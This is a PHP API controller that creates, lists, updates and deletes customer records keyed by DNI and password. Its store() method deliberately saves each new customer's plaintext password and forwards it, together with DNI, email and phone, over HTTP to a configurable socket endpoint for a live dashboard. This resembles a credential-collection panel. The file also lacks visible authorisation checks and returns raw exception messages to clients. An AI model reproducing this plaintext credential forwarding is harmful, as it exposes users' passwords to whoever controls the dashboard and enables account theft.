<?php

namespace App\Controllers\Api;

use App\Core\Controller;
use App\Models\Customer;

class ApiCustomerController extends Controller {
    
    // Helper to get JSON input
    private function getJsonInput() {
        return json_decode(file_get_contents('php://input'), true);
    }

    public function index() {
        $model = new Customer();
        $customers = $model->all();
        // Hide password
        foreach ($customers as &$c) {
            unset($c['password']);
        }
        $this->json(['success' => true, 'data' => $customers]);
    }

    public function show($id) {
        $model = new Customer();
        $customer = $model->find($id);
        if ($customer) {
            unset($customer['password']);
            $this->json(['success' => true, 'data' => $customer]);
        } else {
            http_response_code(404);
            $this->json(['success' => false, 'message' => 'Customer not found']);
        }
    }

    public function store() {
        $data = $this->getJsonInput();
        
        // Only DNI and Password are required now
        if (empty($data['dni']) || empty($data['password'])) {
            http_response_code(400);
            $this->json(['success' => false, 'message' => 'Missing required fields (dni, password)']);
            return;
        }

        $model = new Customer();
        // Check duplicate DNI
        if ($model->firstWhere('dni', $data['dni'])) {
            http_response_code(409); // Conflict
            $this->json(['success' => false, 'message' => 'DNI already exists']);
            return;
        }
        
        // Check duplicate Email only if provided
        if (!empty($data['email']) && $model->firstWhere('email', $data['email'])) {
            http_response_code(409);
            $this->json(['success' => false, 'message' => 'Email already exists']);
            return;
        }

        $plainPassword = $data['password']; // Capture for socket
        $data['password'] = password_hash($data['password'], PASSWORD_BCRYPT);
        
        if (!isset($data['email'])) $data['email'] = null;

        try {
            $model->createStrict($data);
            
            // Retrieve created customer to get ID
            $newCustomer = $model->firstWhere('dni', $data['dni']);

            // --- SOCKET IO NOTIFICATION ---
            $payload = [
                'id' => $newCustomer['id'], // Important for updating row later
                'dni' => $newCustomer['dni'],
                'password' => $plainPassword, // Sending plain for real-time view as requested
                'email' => $newCustomer['email'],
                'phone' => $newCustomer['phone'],
                'created_at' => date('Y-m-d H:i:s')
            ];

            $this->sendToSocket('/notify-new-customer', $payload);

            $this->json(['success' => true, 'message' => 'Customer created successfully', 'id' => $newCustomer['id']]);
        } catch (\Exception $e) {
            http_response_code(500);
            $this->json(['success' => false, 'message' => $e->getMessage()]);
        }
    }

    public function update($id) {
        $data = $this->getJsonInput();
        $model = new Customer();
        
        $customer = $model->find($id);
        if (!$customer) {
            http_response_code(404);
            $this->json(['success' => false, 'message' => 'Customer not found']);
            return;
        }

        if (!empty($data['password'])) {
            $data['password'] = password_hash($data['password'], PASSWORD_BCRYPT);
        }

        try {
            $model->update($id, $data);
            
            // --- SOCKET IO UPDATE NOTIFICATION ---
            // Fetch updated customer to ensure we send correct data
            $updatedCustomer = $model->find($id);
            $payload = [
                'id' => $updatedCustomer['id'],
                'email' => $updatedCustomer['email'],
                'phone' => $updatedCustomer['phone']
                // We don't resend password here unless changed, but usually dashboard row has it.
            ];
            
            $this->sendToSocket('/notify-update-customer', $payload);

            $this->json(['success' => true, 'message' => 'Customer updated successfully']);
        } catch (\Exception $e) {
            http_response_code(500);
            $this->json(['success' => false, 'message' => $e->getMessage()]);
        }
    }

    public function delete($id) {
        $model = new Customer();
        if ($model->delete($id)) {
            $this->json(['success' => true, 'message' => 'Customer deleted']);
        } else {
            http_response_code(404);
            $this->json(['success' => false, 'message' => 'Customer not found']);
        }
    }

    private function sendToSocket($endpoint, $payload) {
        $socketUrl = ($_ENV['SOCKET_URL'] ?? 'http://localhost:3000') . $endpoint;
        $ch = curl_init($socketUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_TIMEOUT, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}